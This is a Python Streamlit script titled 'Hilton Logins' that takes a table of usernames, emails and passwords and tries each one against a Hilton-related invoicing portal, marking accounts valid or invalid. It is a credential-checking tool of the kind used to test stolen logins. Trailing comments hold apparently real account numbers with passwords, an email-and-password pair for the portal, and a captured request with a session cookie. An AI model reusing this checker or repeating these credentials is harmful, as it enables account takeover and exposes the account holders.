import streamlit as st
from bs4 import BeautifulSoup
import requests
import tempfile
import threading
import os


def delete_file_after_delay(file_path, delay=120):
    def delete_file():
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                st.write(f"{file_path} has been deleted after {delay} seconds.")
        except Exception as e:
            st.error(f"Error deleting file: {e}")
    timer = threading.Timer(delay, delete_file)
    timer.start()

st.title("Hilton Logins")

def account_status_process_for_hilton(df):
    st.title('LOGS')

    df['Account Status']  = ''

    for index, row in df.iterrows():
        username = row['username']
        password = row['password']
        email    = row['email']
        url      = row['url']

        user_identifier = username if username != 'none' else email
        st.write(f"{index+1} - Attempting login for Username/Email: {user_identifier} and {password}")
        if user_identifier and password:
            with requests.Session() as session:
                try:
                    login_url = 'https://hilton.enviocfdi.com/'
                    response_get = session.get(login_url)

                    form_data = {
                        'username': user_identifier,
                        'password': password,
                    }

                    response_post = session.post(login_url, data=form_data)
                    if row['url'] == "https://hilton.taleo.net/careersection/iam/accessmanagement/login.jsf":
                        st.warning(f"URL Out of dated failed for {user_identifier}.")
                        df.at[index, 'Account Status'] = 'Out Dated URL'
                    elif "Usuario/Contraseña incorrecto." in response_post.text:
                        st.error(f"Login failed for {user_identifier}.")
                        df.at[index, 'Account Status'] = 'Invalid'
                    elif "Bienvenido:" in response_post.text:
                        st.success(f"Login successful for {user_identifier}!")
                        df.at[index, 'Account Status'] = 'Valid'
                    else:
                        st.error(f"Unexpected response for {user_identifier}.")
                        df.at[index, 'Account Status'] = 'Unexpected Response'

                except Exception as e:
                    st.error(f"An error occurred for {user_identifier}: {e}")
        else:
            st.warning(f"Missing username/email or password for row {index}.")            

    st.divider()

    with tempfile.NamedTemporaryFile(delete=False, suffix="hilton.csv") as temp_file:
        df.to_csv(temp_file.name, index=False)
        temp_file_path = temp_file.name
        st.warning(f"Temporary CSV file Created at: {temp_file_path}")

    return df



# https://secure3.hilton.com/en/hi/customer/login/index.htm
# 550165646
# Ifeyinwa1


# www.hilton.com/en/auth2/guest/login/
# 687896268
# Coolest1


# https://hilton.enviocfdi.com/
# administracion@ziena.com.mx
# fmrNlDMB


# POST
# https://hilton.enviocfdi.com/


# FORM DATA
# username	"administracion@ziena.com.mx"
# password	"fmrNlDMB"


# REQUEST HEADERS
# Accept
# 	text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
# Accept-Encoding
# 	gzip, deflate, br, zstd
# Accept-Language
# 	en-US,en;q=0.5
# Connection
# 	keep-alive
# Content-Length
# 	56
# Content-Type
# 	application/x-www-form-urlencoded
# Cookie
# 	PHPSESSID=vkchdp10sldqas8jffic9or5g4
# Host
# 	hilton.enviocfdi.com
# Origin
# 	https://hilton.enviocfdi.com
# Priority
# 	u=0, i
# Referer
# 	https://hilton.enviocfdi.com/
# Sec-Fetch-Dest
# 	document
# Sec-Fetch-Mode
# 	navigate
# Sec-Fetch-Site
# 	same-origin
# Sec-Fetch-User
# 	?1
# Upgrade-Insecure-Requests
# 	1
# User-Agent
# 	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0